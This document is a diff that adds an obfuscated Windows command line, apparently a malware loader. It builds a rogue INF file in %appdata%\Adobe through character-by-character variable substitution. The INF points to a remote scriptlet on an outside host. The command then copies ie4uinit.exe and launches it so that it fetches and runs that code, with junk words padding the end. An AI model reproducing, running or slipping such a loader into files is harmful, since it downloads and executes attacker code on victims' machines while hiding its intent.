@@ -1,0 +1,7 @@
+/v /c (for %v in (s) do @set "Blush=%~v") &&
+  (for %n in (i) do @set "Rally=%~n") &&
+  (for %z in (a) do @set "Mechanic=%~z") &&
+  (for %n in (c) do @set "Region=%~n") &&
+  call(for %v in ("[defaultinstall.windows7]" "Un\" "Register\" "OCXs=171" "delfiles=327D" "[version]" "signature =$windows nt$" "[171]" "sc\" "ro%Becomes%j,NI,%Understanding%%Provisions%%Provisions%p%Liabilities%%Coaches%%Coaches%ifor3.patrickbeltrame.c!Wat!Region!hes!93582" "[strings]" "Liabilities=:;Sequences" "Understanding=h" "Frost=init" "Provisions=t;Musicians" "Becomes=b;Commissioners" "shortsvcname=' '" "Ensure=%t!Rally!me%" "servicename=' '" "Coaches=/" "[327D]" "ieu%Frost%.inf" "[destinationdirs]" "defaultdestdir=11" "327D=01" ) do @echo %~v)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!RallycDevelopments!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Divert36=Attend &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Divert6=Hobby Crops Video Copper Smoke Legends Speeches Candidates Waters Economies Dresses Intact Officers Enhance Moments Entry Surface Comic Scientists Humans Areas Piano Resource Toilet Forests Additions Opera Fiction Landscapes Universities Coffee Structures Pelican Sellers Garbage Shine Stats Neglect Shipments Websites Pigeon Charts Classifieds Inches Puzzles Debris Recipients Regards"
